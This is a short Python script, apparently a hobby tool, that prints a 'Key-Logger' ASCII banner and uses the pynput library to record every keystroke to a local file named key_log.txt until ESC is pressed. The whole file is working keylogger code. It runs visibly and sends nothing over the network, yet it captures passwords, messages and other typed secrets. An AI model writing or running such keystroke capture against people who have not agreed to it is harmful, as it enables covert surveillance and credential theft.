from pynput import keyboard
import os

def clear():

    if os.name == 'nt':
        _ = os.system('cls')

    else:
        _ = os.system('clear')


clear()
print ("")
print ("")
print ("")
print ("")
print ("")
print ("")
print ("")
print ("")
print ("")
print ("")
print ("")
print ("")
print ("")
print ("")
print ("")
print ("")
print ("")
print ("")
print ("")
print ("")
print ("")
print ("")
print ("")
print ("")
print ("$$\   $$\                                        $$\                                                        ")
print ("$$ | $$  |                                       $$ |                                                       ")
print ("$$ |$$  / $$$$$$\  $$\   $$\                     $$ |      $$$$$$\   $$$$$$\   $$$$$$\   $$$$$$\   $$$$$$\  ")
print ("$$$$$  / $$  __$$\ $$ |  $$ |      $$$$$$\       $$ |     $$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ ")
print ("$$  $$<  $$$$$$$$ |$$ |  $$ |      \______|      $$ |     $$ /  $$ |$$ /  $$ |$$ /  $$ |$$$$$$$$ |$$ |  \__|")
print ("$$ |\$$\ $$   ____|$$ |  $$ |                    $$ |     $$ |  $$ |$$ |  $$ |$$ |  $$ |$$   ____|$$ |      ")
print ("$$ | \$$\\$$$$$$$\ \$$$$$$$ |                    $$$$$$$$\\$$$$$$  |\$$$$$$$ |\$$$$$$$ |\$$$$$$$\ $$ |      ")
print ("\__|  \__|\_______| \____$$ |                    \________|\______/  \____$$ | \____$$ | \_______|\__|      ")
print ("                   $$\   $$ |                                       $$\   $$ |$$\   $$ |                    ")
print ("                   \$$$$$$  |                                       \$$$$$$  |\$$$$$$  |                    ")
print ("                    \______/                                         \______/  \______/                     ")
print ("                                             Press: ESC to Stop                                             ")
def on_press(key):
    try:

        with open("key_log.txt", "a") as log_file:
            log_file.write(f'{key.char}')
    except AttributeError:

        with open("key_log.txt", "a") as log_file:
            log_file.write(f'[{key}]')

def on_release(key):

    if key == keyboard.Key.esc:
        return False


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
